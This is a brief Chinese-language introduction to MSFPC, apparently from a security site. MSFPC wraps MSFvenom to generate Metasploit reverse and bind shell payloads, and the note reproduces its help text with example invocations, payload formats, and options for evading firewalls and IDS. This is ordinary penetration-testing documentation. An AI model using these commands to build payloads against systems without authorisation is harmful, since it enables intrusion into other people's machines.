

> 一般来说，生成payload的默认工具是MSFvenom，这是一个独立于Metasploit的payload生成器及编码器。虽然它是一个非常强大的payload生成神器，但是对于一些新手来说，可能难以在短时间内熟悉其操作。即使在进行最初的了解之后，生成一个基本的payload也需要输入相当多的内容，而今天，我们将看到使用MSFPC更便捷地生成paylaod。

> MSFPC，或者说是MSFvenom Payload生成器，其实是一个基于MSFvenom的Payload生成器，但是它旨在简化基本的有效载荷创建过程，用户使用MSFPC可以尽可能简单地创建Payload，有时甚至只需要一个参数！如果你以前使用过MSFvenom，那么可能已经自行编写了一个简单的shell脚本来自动化频繁地生成Payload。即使这样，这个工具也绝对值得一试。


安装:

帮助:
```
root@kali:~/proxychains-ng# msfpc -h
 [*] MSFvenom Payload Creator (MSFPC v1.4.4)

 /usr/bin/msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
   Example: /usr/bin/msfpc windows 192.168.1.10        # Windows & manual IP.
            /usr/bin/msfpc elf bind eth0 4444          # Linux, eth0's IP & manual port.
            /usr/bin/msfpc stageless cmd py https      # Python, stageless command prompt.
            /usr/bin/msfpc verbose loop eth1           # A payload for every type, using eth1's IP.
            /usr/bin/msfpc msf batch wan               # All possible Meterpreter payloads, using WAN IP.
            /usr/bin/msfpc help verbose                # Help screen, with even more information.

 <TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .dll]
   
 Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address.
 Missing <DOMAIN/IP> will default to the IP menu.

 Missing <PORT> will default to 443.

 <CMD> is a standard/native command prompt/terminal to interactive with.
 <MSF> is a custom cross platform shell, gaining the full power of Metasploit.
 Missing <CMD/MSF> will default to <MSF> where possible.

 <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
 <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
 Missing <BIND/REVERSE> will default to <REVERSE>.

 <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.
 <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.
 Missing <STAGED/STAGELESS> will default to <STAGED> where possible.

 <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
 <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
 <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
 <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.
 Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.

 <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGLESS> & <TCP + HTTP + HTTPS + FIND_PORT> 
 <LOOP> will just create one of each <TYPE>.

 <VERBOSE> will display more information.
```
- [如何使用MSFPC简化生成Payload的过程](http://www.freebuf.com/sectool/153801.html)